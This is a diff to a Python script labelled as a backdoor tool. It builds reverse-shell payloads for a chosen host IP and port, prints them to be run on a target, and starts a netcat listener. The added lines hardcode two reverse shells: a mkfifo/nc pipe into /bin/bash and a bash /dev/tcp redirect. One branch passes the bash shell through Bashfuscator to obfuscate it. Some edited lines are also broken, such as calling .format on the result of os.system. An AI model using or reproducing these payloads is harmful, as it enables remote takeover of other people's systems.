@@ -4,7 +4,7 @@
 
 """
 Author: Skiddyfruit
-Version: 1.0
+Version: 2.0
 License: MIT-3.0
 Category: backdoors
 """
@@ -12,9 +12,9 @@ Category: backdoors
 """
 requirements:
 
-1. Git
-2. python3 python3-pip python3-argcomplete xclip
-- sudo apt-get install python3 python3-pip python3-argcomplete xclip xsel
+Run setup.py
+
+sudo python3 setup.py
 """
 import ifaddr # Fetching ip from interface
 import socket
@@ -36,7 +36,7 @@ ip = str(input("HOST IP:\n"))
 port = str(input("PORT:\n"))
 #shell = str(input("Please select an option?\n"))
 def full():
-    print("Welcome, let's generate a reverse shell of your choice\n")
+    print("Welcome, let us generate a choosen reverse shell\n")
     global ip
     global port
     
@@ -53,7 +53,7 @@ def full():
 
             print("Run the following payload on target: \n")
             print(ipreplaced.replace("[port]", port), "\n")
-            print("starting Listener:\n")
+            print("Starting Netcat Listener:\n")
             os.system(str("netcat -nvlp {}").format(port))
 
     elif int(selection) == 2:
@@ -77,7 +77,7 @@ def full():
                             
                 print("Run the following payload on target: \n")
                 print(ipreplaced.replace("[port]", port), "\n")
-                print("starting Listener:\n")
+                print("starting Netcat Listener:\n")
                 os.system(str("netcat -nvlp {}").format(port))
     elif int(selection) == 4:
             with open("myshells.txt", "r") as shells:
@@ -87,21 +87,28 @@ def full():
                 #print(ipreplaced.replace("[port]", '"{}"')).format(port)
                         
                 print("Run the following payload on target: \n")
-                print(ipreplaced.replace("[port]", port), "\n")
+                
+                print("mkfifo pipe && nc {} {} <pipe | /bin/bash &>pipe".format(ip, port), "\n")
+
+                print("or\n")
+
+                print("bash -i >& /dev/tcp/{}/{} 0>&1".format(ip, port), "\n")
+
                 print("starting Listener:\n")
+
                 os.system(str("netcat -nvlp {}").format(port))
+              
 
     elif int(selection) == 5:
-                #os.system("cd ~")
-                #os.system("git clone https://github.com/Bashfuscator/Bashfuscator;cd Bashfuscator;python3 setup.py install --user;cd /bashfuscator/bin")
-                if os.path.exists("~/Bashfuscator") == True:
-                    finalpayload = os.system("./bashfuscator -c 'bash -i >& /dev/tcp/{}/{} 0>&1'").format(str((ip, port)))
-                    print(finalpayload, end=" ")
+               
+                #if os.path.exists("~/Bashfuscator"):
+                #    finalpayload = os.system("./bashfuscator -c 'bash -i >& /dev/tcp/{}/{} 0>&1'").format(str((ip, port)))
+                #    print(finalpayload, end=" ")
                 #print("./bashfuscator -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(ip, port))
-                elif os.path.exists("~/Bashfuscator") == False:
-                    os.system("cd ~")
-                    os.system("git clone https://github.com/Bashfuscator/Bashfuscator;cd Bashfuscator;python3 setup.py install --user;cd /bashfuscator/bin")
-                    finalpayload = os.system("./bashfuscator -c 'bash -i >& /dev/tcp/{}/{} 0>&1'").format(str((ip, port)))
+                #else:
+                    #os.system("cd ~")
+                    #os.system("git clone https://github.com/Bashfuscator/Bashfuscator;cd Bashfuscator;python3 setup.py install --user;cd /bashfuscator/bin")
+                    finalpayload = os.system("bashfuscator -c 'bash -i >& /dev/tcp/{}/{} 0>&1'").format(str((ip, port)))
                     print(finalpayload, end=" ")
                     os.system(str("netcat -nvlp {}").format(port))
 
